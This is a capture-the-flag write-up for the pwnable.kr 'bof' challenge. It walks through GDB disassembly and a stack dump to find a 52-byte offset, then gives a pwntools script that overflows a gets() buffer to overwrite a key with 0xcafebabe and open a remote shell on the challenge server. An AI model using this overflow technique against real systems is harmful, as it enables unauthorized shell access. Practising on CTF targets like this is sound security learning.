# bof

1. Download the files:

    ```bash
    wget http://pwnable.kr/bin/bof
    wget http://pwnable.kr/bin/bof.c
    ```

2. `cat bof.c` : observing the source code tells us that the program accepts a string input, using which we have to overflow the buffer to alter the value of key `0xdeadbeef`.
3. Using **GDB**:

    ```bash
    gdb ./bof
    ```

    Breakpoint at main and disassemble func():

    ```gdb
    Reading symbols from ./bof...
    (No debugging symbols found in ./bof)
    (gdb) break main 
    Breakpoint 1 at 0x68d
    (gdb) r
    Starting program: /home/harshit/Downloads/bof 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, 0x5655568d in main ()
    (gdb) disas func
    Dump of assembler code for function func:
    0x5655562c <+0>:    push   %ebp
    0x5655562d <+1>:    mov    %esp,%ebp
    0x5655562f <+3>:    sub    $0x48,%esp
    0x56555632 <+6>:    mov    %gs:0x14,%eax
    0x56555638 <+12>:   mov    %eax,-0xc(%ebp)
    0x5655563b <+15>:   xor    %eax,%eax
    0x5655563d <+17>:   movl   $0x5655578c,(%esp)
    0x56555644 <+24>:   call   0xf7de9140 <puts>
    0x56555649 <+29>:   lea    -0x2c(%ebp),%eax
    0x5655564c <+32>:   mov    %eax,(%esp)
    0x5655564f <+35>:   call   0xf7de8660 <gets>
    0x56555654 <+40>:   cmpl   $0xcafebabe,0x8(%ebp)
    0x5655565b <+47>:   jne    0x5655566b <func+63>
    0x5655565d <+49>:   movl   $0x5655579b,(%esp)
    0x56555664 <+56>:   call   0xf7dc1430 <system>
    0x56555669 <+61>:   jmp    0x56555677 <func+75>
    .
    .
    .
    .
    ```

4. We see `cmpl` instruction, comparing the key with `0xcafebabe` at addr `0x56555654`. Break there and observe the stack memory:

    ```gdb
        (gdb) break *0x56555654
    Breakpoint 2 at 0x56555654
    (gdb) c
    Continuing.
    overflow me : 
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

    Breakpoint 2, 0x56555654 in func ()
    (gdb) x/100x $sp
    0xffffcf60: 0xffffcf7c  0xffffd21b  0x00000002  0x0000001c
    0xffffcf70: 0xf7ffcfe8  0x00000018  0x00000000  0x61616161
    0xffffcf80: 0x61616161  0x61616161  0x61616161  0x61616161
    0xffffcf90: 0x61616161  0x61616161  0x61616161  0x61616161
    0xffffcfa0: 0x61616161  0xf7d80061  0xffffcfc8  0x5655569f
    0xffffcfb0: 0xdeadbeef  0x00000000  0x00000000  0x00000000
    0xffffcfc0: 0x00000000  0x00000000  0x00000000  0xf7d95cb9
    0xffffcfd0: 0x00000001  0xffffd084  0xffffd08c  0xffffcff0
    0xffffcfe0: 0xf7fa1e34  0x5655568a  0x00000001  0xffffd084
    0xffffcff0: 0xf7fa1e34  0x565556b0  0xf7ffcb60  0x00000000

    ```

    Wee see `0xdeadbeef` at `0xffffcfb0` and start of our input at the last column of `0xffffcf70`. So we have to overflow `(1+3*4)*4 = 52` bytes before writing `0xcafebabe`

5. Using pwntools:

    ```python
    from pwn import *

    payload = b'a' * 52 + b'\xbe\xba\xfe\xca'
    shell = remote('pwnable.kr',9000)
    shell.send(payload)
    shell.interactive()
    ```

    This spawns a shell (see `system("/bin/sh")` in `bof.c`)

    ```shell
    [+] Opening connection to pwnable.kr on port 9000: Done
    [*] Switching to interactive mode
    $ ls
    $ ls
    bof
    bof.c
    flag
    log
    super.pl
    $ cat flag
    ```
